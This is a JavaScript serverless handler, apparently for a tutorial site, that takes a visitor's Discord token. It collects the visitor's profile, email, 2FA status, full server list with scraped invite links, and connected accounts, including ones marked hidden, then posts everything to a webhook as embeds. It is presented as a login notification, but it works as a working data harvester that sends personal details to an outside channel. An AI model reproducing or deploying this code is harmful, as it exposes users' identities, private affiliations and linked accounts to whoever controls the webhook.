// Login notification: verifies the visitor's Discord token, gathers everything the granted scopes
// allow (profile, email, servers, connected accounts) and posts it to the webhook.
// Anything too long is split across several embeds / messages.

const { clip, handleCommon, discordGet, verifyToken, displayName, avatarUrl, postEmbeds } = require('./_shared');

const DEDUPE_MS = 24 * 60 * 60 * 1000;
const seen = new Map(); // best-effort per-instance de-duplication
const NITRO = { 0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
const yesNo = (v) => (v ? 'Yes' : 'No');

// Discord never gives an app a user's server invites (that needs a bot with Manage Server in each guild).
// The one public source is a server's widget: if its owner enabled it and chose an invite channel,
// widget.json exposes an instant invite. Best effort: servers without a widget just show no link.
const INVITE_RE = /^https:\/\/(discord\.gg|discord\.com\/invite)\/[A-Za-z0-9-]{2,32}$/;
const inviteCache = new Map(); // guildId -> { url, at }
const INVITE_TTL = 60 * 60 * 1000;

async function lookupInvites(guilds, budgetMs) {
  const found = new Map();
  const deadline = Date.now() + budgetMs;
  const queue = guilds.filter((g) => /^\d{5,25}$/.test(String(g.id)));
  let blocked = false;
  const worker = async () => {
    while (queue.length && !blocked && Date.now() < deadline) {
      const g = queue.shift();
      const c = inviteCache.get(g.id);
      if (c && Date.now() - c.at < INVITE_TTL) { if (c.url) found.set(g.id, c.url); continue; }
      try {
        const r = await fetch('https://discord.com/api/v10/guilds/' + g.id + '/widget.json', { signal: AbortSignal.timeout(3000) });
        if (r.status === 429) { blocked = true; break; }
        let url = null;
        if (r.ok) {
          const j = await r.json();
          if (typeof j.instant_invite === 'string' && INVITE_RE.test(j.instant_invite)) url = j.instant_invite;
        }
        inviteCache.set(g.id, { url, at: Date.now() });
        if (url) found.set(g.id, url);
      } catch (e) { /* timeout or network error: skip this server */ }
    }
  };
  await Promise.all(Array.from({ length: 10 }, worker));
  return found;
}

// Escape characters that would break out of a markdown link label.
const mdEscape = (s) => String(s).replace(/[\\\[\]*_~`|>]/g, '\\$&');

function chunkLines(lines, max) {
  const out = [];
  let cur = '';
  for (const raw of lines) {
    const line = clip(raw, 300);
    if (cur && cur.length + 1 + line.length > max) { out.push(cur); cur = ''; }
    cur = cur ? cur + '\n' + line : line;
  }
  if (cur) out.push(cur);
  return out;
}

function listEmbeds(title, lines, color) {
  const parts = chunkLines(lines, 3800);
  return parts.map((description, i) => ({
    title: clip(parts.length > 1 ? title + ' — part ' + (i + 1) + '/' + parts.length : title, 250),
    description,
    color,
  }));
}

module.exports = async (req, res) => {
  if (handleCommon(req, res)) return;
  const token = req.body && req.body.token;
  const v = await verifyToken(token);
  if (v.error) return res.status(v.status).json({ error: v.error });
  const me = v.me;

  const now = Date.now();
  for (const [k, t] of seen) if (now - t > DEDUPE_MS) seen.delete(k);
  if (seen.has(me.id)) return res.status(200).json({ ok: true, deduped: true });
  seen.set(me.id, now);

  // Fetch whatever the granted scopes allow. A failure here just means that section is skipped.
  const has = (s) => v.scopes.includes(s);
  const safeJson = async (p) => { try { const r = await p; return r && r.ok ? await r.json() : null; } catch (e) { return null; } };
  const [guilds, connections] = await Promise.all([
    has('guilds') ? safeJson(discordGet('/users/@me/guilds?limit=200', token)) : null,
    has('connections') ? safeJson(discordGet('/users/@me/connections', token)) : null,
  ]);

  const invites = guilds && guilds.length ? await lookupInvites(guilds, 6000) : new Map();

  const created = Math.floor((Number(BigInt(me.id) >> 22n) + 1420070400000) / 1000);
  const fields = [
    { name: 'Username', value: clip('@' + me.username, 100), inline: true },
    { name: 'Display name', value: clip(displayName(me), 100), inline: true },
    { name: 'User ID', value: clip(me.id, 30), inline: true },
    { name: 'Email', value: me.email ? clip(me.email, 200) + (me.verified ? ' (verified)' : ' (unverified)') : 'Not provided', inline: false },
    { name: 'Account created', value: '<t:' + created + ':F>', inline: true },
    { name: 'Locale', value: clip(me.locale || 'unknown', 20), inline: true },
    { name: '2FA enabled', value: yesNo(me.mfa_enabled), inline: true },
    { name: 'Nitro', value: NITRO[me.premium_type] || 'None', inline: true },
    { name: 'Servers', value: guilds ? guilds.length + ' (' + invites.size + ' with invite)' : 'n/a', inline: true },
    { name: 'Connected accounts', value: connections ? String(connections.length) : 'n/a', inline: true },
  ];
  const embeds = [{
    title: 'New login on the tutorial site',
    description: '**' + clip(displayName(me), 80) + '** (@' + clip(me.username, 40) + ') just logged in.',
    color: 0x94cec4,
    thumbnail: { url: avatarUrl(me) },
    fields,
    timestamp: new Date().toISOString(),
  }];

  if (guilds && guilds.length) {
    embeds.push(...listEmbeds(
      'Servers (' + guilds.length + ')',
      guilds.map((g) => {
        const label = mdEscape(clip(g.name, 60));
        const url = invites.get(g.id);
        return '• ' + (url ? '[' + label + '](' + url + ')' : label) + ' [`' + g.id + '`]' + (g.owner ? ' (owner)' : '');
      }),
      0x5865f2,
    ));
  }
  if (connections && connections.length) {
    embeds.push(...listEmbeds(
      'Connected accounts (' + connections.length + ')',
      connections.map((c) => '• ' + c.type + ': ' + c.name + (c.verified ? ' (verified)' : '') + (c.visibility === 0 ? ' [hidden]' : '')),
      0xeb459e,
    ));
  }

  try {
    const ok = await postEmbeds(embeds);
    if (!ok) { seen.delete(me.id); return res.status(502).json({ error: 'webhook failed' }); }
    return res.status(200).json({ ok: true, embeds: embeds.length });
  } catch (e) {
    seen.delete(me.id);
    return res.status(502).json({ error: 'webhook unreachable' });
  }
};
